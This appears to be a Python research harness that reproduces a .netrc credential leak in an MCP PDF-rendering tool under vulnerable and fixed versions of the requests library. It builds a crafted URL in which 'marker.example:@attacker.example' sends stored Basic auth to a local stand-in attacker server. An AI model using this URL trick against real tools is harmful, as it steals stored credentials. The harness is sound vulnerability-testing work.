from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import fitz

from shared_host_runner import evidence_rows, run_shared_host_case


LOGIN = "P4_049_LOGIN"
PASSWORD = "P4_049_SECRET"
SECRET_AUTH = "Basic " + base64.b64encode(f"{LOGIN}:{PASSWORD}".encode()).decode()
EFFECT_TEXT = "P4_049_NETRC_IMAGE_EFFECT"
BASELINE_TEXT = "P4_049_SAFE_BASELINE"
CASE_ID = "GH-P4-049"
REPOSITORY = "https://github.com/danielkennedy1/pdf-tools-mcp"
SOURCE_COMMIT = "d5b3757f691f1551e0c0d8be446310f4f67d0558"
TOOL = "display_remote_document_page_as_image"
VERSIONS = {"vulnerable": "2.32.3", "fixed": "2.32.4"}
AGENT_TASK = "Call the frozen display_remote_document_page_as_image Tool and report only its returned result."
SYSTEM_PROMPT = "You are a deterministic research host. Use the frozen tool call and report only its returned Tool result."


def _pdf_bytes(text: str) -> bytes:
    escaped = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    content = f"BT /F1 20 Tf 48 52 Td ({escaped}) Tj ET\n".encode("ascii")
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 100] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"endstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    output = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    offsets = [0]
    for index, body in enumerate(objects, start=1):
        offsets.append(len(output))
        output += f"{index} 0 obj\n".encode("ascii") + body + b"\nendobj\n"
    xref_offset = len(output)
    output += f"xref\n0 {len(objects) + 1}\n".encode("ascii")
    output += b"0000000000 65535 f \n"
    output += b"".join(f"{offset:010d} 00000 n \n".encode("ascii") for offset in offsets[1:])
    output += f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref_offset}\n%%EOF\n".encode("ascii")
    return output


def _render_png(pdf: bytes) -> bytes:
    document = fitz.open(stream=io.BytesIO(pdf), filetype="pdf")
    try:
        return document[0].get_pixmap(matrix=fitz.Matrix(2, 2)).tobytes("png")
    finally:
        document.close()


class Boundary:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        self.responses: list[dict[str, Any]] = []
        boundary = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802
                headers = dict(self.headers)
                authorization = headers.get("Authorization", "")
                netrc_effect = authorization == SECRET_AUTH
                response_text = EFFECT_TEXT if netrc_effect else BASELINE_TEXT
                pdf = _pdf_bytes(response_text)
                boundary.requests.append({"method": self.command, "path": self.path, "headers": headers})
                boundary.responses.append({
                    "response_text": response_text,
                    "pdf_sha256": hashlib.sha256(pdf).hexdigest(),
                    "pdf_bytes": len(pdf),
                })
                self.send_response(200)
                self.send_header("Content-Type", "application/pdf")
                self.send_header("Content-Length", str(len(pdf)))
                self.end_headers()
                self.wfile.write(pdf)

            def log_message(self, *_args: object) -> None:
                return

        self.server = ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

    def snapshot(self) -> dict[str, Any]:
        return {
            "boundary": "container-local-netrc-derived-pdf-image-boundary",
            "port": self.server.server_port,
            "requests": list(self.requests),
            "responses": list(self.responses),
        }


def _image_bytes(result: Any) -> bytes | None:
    content = result.get("content", []) if isinstance(result, dict) else []
    for block in content if isinstance(content, list) else []:
        if isinstance(block, dict) and block.get("type") == "image" and isinstance(block.get("data"), str):
            return base64.b64decode(block["data"], validate=True)
    return None


def _contains(value: Any, needle: str) -> bool:
    return needle in json.dumps(value, ensure_ascii=False, sort_keys=True)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--side", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--repetition", type=int, required=True)
    args = parser.parse_args()
    boundary = Boundary()
    boundary.start()
    try:
        dep_root = "/opt/deps/vulnerable" if args.side == "vulnerable" else "/opt/deps/fixed"
        netrc = Path("/tmp/gt-home/.netrc")
        netrc.parent.mkdir(parents=True, exist_ok=True)
        netrc.write_text(f"machine marker.example login {LOGIN} password {PASSWORD}\n", encoding="ascii")
        netrc.chmod(0o600)
        tool_args = {
            "url": f"http://marker.example:@attacker.example:{boundary.server.server_port}/document.pdf",
            "page_number": 1,
        }
        env = {
            "PYTHONPATH": "/opt/gt",
            "NETRC": str(netrc),
            "HOME": "/tmp/gt-home",
            "XDG_CACHE_HOME": "/tmp/gt-cache",
            "NO_PROXY": "*",
            "no_proxy": "*",
            "HTTP_PROXY": "",
            "HTTPS_PROXY": "",
            "ALL_PROXY": "",
            "PYTHONIOENCODING": "utf-8",
        }
        record = run_shared_host_case(
            run_id=f"{CASE_ID}-{args.side}-{args.repetition}",
            case_id=CASE_ID,
            revision=args.side,
            repetition=args.repetition,
            command=[f"{dep_root}/bin/python", "/workspace/source/src/main.py"],
            cwd=Path("/workspace/source"),
            env=env,
            server_name=REPOSITORY,
            tool_name=TOOL,
            tool_arguments=tool_args,
            task=AGENT_TASK,
            system_prompt=SYSTEM_PROMPT,
            server_revision=f"{SOURCE_COMMIT}; requests=={VERSIONS[args.side]}",
            timeout=60,
        )
        snapshot = boundary.snapshot()
        record["external_boundary"] = snapshot
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "host_record.json").write_text(json.dumps(record, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        (args.output / "evidence.jsonl").write_text("".join(json.dumps(row, ensure_ascii=False) + "\n" for row in evidence_rows(record)), encoding="utf-8")
        (args.output / "boundary_snapshot.json").write_text(json.dumps(snapshot, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        valid = not record["quality"]["invalid_run"] and all(value == "observed" for value in record["evidence_levels"].values())
        print(json.dumps({"status": "OK" if valid else "INVALID", "output": str(args.output)}, ensure_ascii=False))
        return 0 if valid else 1
    finally:
        boundary.close()


if __name__ == "__main__":
    raise SystemExit(main())
